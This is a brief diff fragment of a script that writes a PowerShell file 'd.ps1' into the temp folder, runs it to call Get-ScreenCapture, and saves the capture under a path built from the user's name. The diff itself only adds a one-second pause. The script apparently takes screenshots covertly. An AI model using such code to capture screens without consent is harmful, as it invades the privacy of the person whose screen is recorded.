@@ -39,6 +39,7 @@
   echo '    }' >> "d.ps1";
   echo '}' >> "d.ps1";
   echo 'Get-ScreenCapture' >> "d.ps1";
+  sleep 1
   $screencapture = echo $env:temp"\"$env:UserName"_Capture"
   powershell -c $env:temp\d.ps1;
   $Screencap = "$env:temp\d.ps1";
